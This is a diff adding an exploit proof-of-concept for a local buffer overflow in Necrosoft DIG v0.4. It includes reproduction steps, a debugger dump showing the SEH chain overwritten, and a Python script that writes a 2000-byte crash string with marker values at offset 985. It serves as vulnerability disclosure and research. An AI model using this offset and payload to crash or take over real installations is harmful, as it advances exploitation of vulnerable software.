@@ -1,0 +1,65 @@
+# Exploit Title: Necrosoft DIG v0.4 - Denial of Service (PoC) SEH overwritten Crash PoC
+# Discovery by: Rafael Pedrero
+# Discovery Date: 2005-01-10
+# Vendor Homepage: http://www.nscan.org/?index=dns
+# Software Link : http://www.nscan.org/?index=dns
+# Tested Version: 0.4
+# Tested on: Windows XP SP3
+# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow
+
+# Steps to Produce the Crash:
+# 1.- Run Necrosoft DIG v0.4 (dig.exe)
+# 2.- copy content DIG_Crash.txt to clipboard (result from this python script)
+# 3.- Paste the content into the field: 'Target'
+# 4.- Click 'TCP lookup' button and you will see a crash.
+
+
+'''
+SEH chain of thread 000003CC
+Address    SE handler
+00D9FF08   43434343
+42424242   *** CORRUPT ENTRY ***
+
+
+EAX 0000000E
+ECX 000004D2
+EDX 000004E0
+EBX 00000041
+ESP 00D9FACC
+EBP 0012FB60
+ESI 00D9FB20
+EDI 009284C5 ASCII
+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EIP 004036B2 DIG.004036B2
+C 0  ES 0023 32bit 0(FFFFFFFF)
+P 1  CS 001B 32bit 0(FFFFFFFF)
+A 0  SS 0023 32bit 0(FFFFFFFF)
+Z 0  DS 0023 32bit 0(FFFFFFFF)
+S 1  FS 003B 32bit 7FFDB000(FFF)
+T 0  GS 0000 NULL
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00010286 (NO,NB,NE,A,S,PE,L,LE)
+ST0 empty
+ST1 empty
+ST2 empty
+ST3 empty
+ST4 empty
+ST5 empty
+ST6 empty
+ST7 empty
+               3 2 1 0      E S P U O Z D I
+FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+
+'''
+
+#!/usr/bin/env python
+
+junk = "\x41" * 985
+crash = junk + "BBBB" + "CCCC" + "\x41" * (2000 - 985 - 4 - 4)
+print "SEH overwritten Crash, full payload length =",len(crash)
+f = open ("DIG_Crash.txt", "w")
+f.write(crash)
+f.close()
